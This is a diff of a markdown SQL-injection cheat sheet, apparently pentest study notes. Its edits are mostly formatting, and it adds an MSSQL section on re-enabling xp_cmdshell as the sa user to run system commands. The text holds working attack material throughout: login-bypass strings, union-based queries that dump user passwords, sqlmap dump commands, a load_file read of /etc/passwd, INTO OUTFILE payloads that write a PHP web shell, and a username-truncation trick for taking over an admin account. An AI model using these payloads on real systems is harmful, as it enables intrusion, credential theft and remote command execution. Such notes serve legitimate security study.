@@ -23,11 +23,11 @@ mysql_connect("localhost", "pelle", "mySecretPassowrd") or die(mysql_error());
 mysql_select_db("myHomepage");
 
 if ($_POST['uname'] != ""){
-	$username = $_POST['username'];
-	$password = $_POST['password'];
-	$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
-	$result = mysql_query($query);
-	$row = mysql_fetch_array($result);
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
+    $result = mysql_query($query);
+    $row = mysql_fetch_array($result);
 }
 ```
 
@@ -52,13 +52,11 @@ If you know the username you could of course use that and then only inject on th
 $query = "SELECT * FROM users WHERE username = 'admin' AND password='whatever' OR '1'='1'";
 ```
 
-
-
 ## SQLmap
 
-Sqlmap is a great tool to perform sql-injections.
-Here is the manual.
-https://github.com/sqlmapproject/sqlmap/wiki/Usage
+Sqlmap is a great tool to perform sql-injections.  
+Here is the manual.  
+[https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
 ### Using sqlmap with login-page
 
@@ -92,23 +90,21 @@ sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
 --proxy="http://192.2.2.2.2:1111"
 ```
 
-**Proxy credencials**
+**Proxy credentials**
 
 ```
 --proxy-cred="username:password"
 ```
 
-
-
 ## Login bypass
 
-
 This is the most classic, standard first test:
+
 ```
 ' or '1'='1
 ```
 
-Then you have:
+If this outputs an error, then it's likely you have an SQL injection vulnerability. To test further we can use:
 
 ```
 -'
@@ -154,7 +150,7 @@ The two main ways for perform a sql-injection: **error based** or **blind**.
 
 If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure.
 
-For example, if we have a url that end with 
+For example, if we have a url that end with
 
 ```
 http://example.com/photoalbum.php?id=1
@@ -162,8 +158,8 @@ http://example.com/photoalbum.php?id=1
 
 #### Step 1 - Add the tick '
 
-So first we should try to break the sql-syntaxt by adding a `'`.
-We should first ad a `'` or a `"`. 
+So first we should try to break the sql-syntaxt by adding a `'`.  
+We should first ad a `'` or a `"`.
 
 ```
 http://example.com/photoalbum.php?id=1'
@@ -175,8 +171,8 @@ If the page then returns a blank page or a page with a sql-error we know that th
 
 So in order to enumerate the columns of a table we can use the **order by**
 
-**Order by 1** means sort by values of the first column from the result set.
-**Order by 2** means sort by values of the second column from the result set. 
+**Order by 1** means sort by values of the first column from the result set.  
+**Order by 2** means sort by values of the second column from the result set.
 
 So it is basically just a tool to order the data in a table. But we can use it to find out how many columns a table has. Because if we do **order by 10** when there really only is 9 columns sql will throw an error. And we will know how many columns the table has.
 
@@ -187,7 +183,7 @@ http://example.com/photoalbum.php?id=1 order by 9
 http://example.com/photoalbum.php?id=1 order by 10
 ```
 
-So you just increase the number (or do a binary tree search if you want tot do it a bit faster) until you get an error, and you know how many columns the table has. 
+So you just increase the number \(or do a binary tree search if you want tot do it a bit faster\) until you get an error, and you know how many columns the table has.
 
 #### Step 3 - Find space to output db
 
@@ -203,9 +199,9 @@ For all the columns that exists. This will return the numbers of the columns tha
 
 #### Step 4 - Start enumerating the database
 
-Now we can use that field to start outputing data. For example if columns number five has been visible in step 3, we can use that to output the data. 
+Now we can use that field to start outputing data. For example if columns number five has been visible in step 3, we can use that to output the data.
 
-Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine (mysql, mssql, postgres).
+Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine \(mysql, mssql, postgres\).
 
 ```
 # Get username of the sql-user
@@ -228,8 +224,6 @@ http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,
 password),6,7,8,9 FROM users
 ```
 
-
-
 ### Blind sql-injection
 
 We say that it is blind because we do not have access to the error log. This make the whole process a lot more complicated. But it is of course still possible to exploit.
@@ -242,23 +236,21 @@ Since we do not have access to the logs we do not know if our commands are synta
 http://example.com/photoalbum.php?id=1-sleep(4)
 ```
 
-If it lods for four seconds exta we know that the database is processing our sleep() command. 
-
+If it lods for four seconds exta we know that the database is processing our sleep\(\) command.
 
 ### Get shell from sql-injection
 
-The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system. The will let us write a backdoor to the system that we can use.
-
+The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system. The will let us write a backdoor to the system that we can use.  This is very uncommon nowadays however
 
 #### Load files
 
-UNION SELECT 1, load_file(/etc/passwd) #
+UNION SELECT 1, load\_file\(/etc/passwd\) \#
 
 ```
 http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
-
 ```
+
 #### Write files
 
 ```
@@ -269,19 +261,44 @@ http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
 ```
 
-#### MSSQL - xp_cmdshell
+#### MSSQL - xp\_cmdshell
 
-You can run commands straight from the sql-query in MSSQL.
+You can run commands straight from the sql-query in MSSQL.  There are a couple of tools in Kali we can use for this.  First is sqsh which can be invoked in the following manner:
 
+`sqsh -S IP -U sa`
+
+Rarely is xp\_cmdshell enabled anymore, so a normal database user cannot use it to invoke commands.  However, the database admin, sa, can re-enable it.
+
+```sqsh
+1> exec sp_configure 'show advanced options', 1 
+2> go 
+Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
+(return status = 0) 
+1> reconfigure 
+2> go 
+1> exec sp_configure 'xp_cmdshell', 1 
+2> go 
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. 
+(return status = 0) 
+1> reconfigure 
+2> go 
+```
+
+We can then execute commands on the machine in the following manner:
+
+```sqsh
+1> exec master..xp_cmdshell 'ipconfig' 
+2> go 
+```
 
 ## Truncating Mysql Vulerability
 
-Basically this happens when you don't validate the length of user input. 
+Basically this happens when you don't validate the length of user input.   
 Two things are needed for it to work:
 
-- Mysql does not make comparisons in binary mode. This means that "admin" and "admin        " are the same.
+* Mysql does not make comparisons in binary mode. This means that "admin" and "admin        " are the same.
 
-- If the username column in the database has a character-limit the rest of the characters are truncated, that is removed. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+* If the username column in the database has a character-limit the rest of the characters are truncated, that is removed. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
 
 With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can insert the following string
 
@@ -291,10 +308,9 @@ admin               removed
 
 This means that the "removed" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectively be inserted as "admin".
 
-
-
 ## References
 
-http://resources.infosecinstitute.com/sql-truncation-attack/
-http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
-http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/
+[http://resources.infosecinstitute.com/sql-truncation-attack/](http://resources.infosecinstitute.com/sql-truncation-attack/)  
+[http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)  
+[http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/](http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/)
+
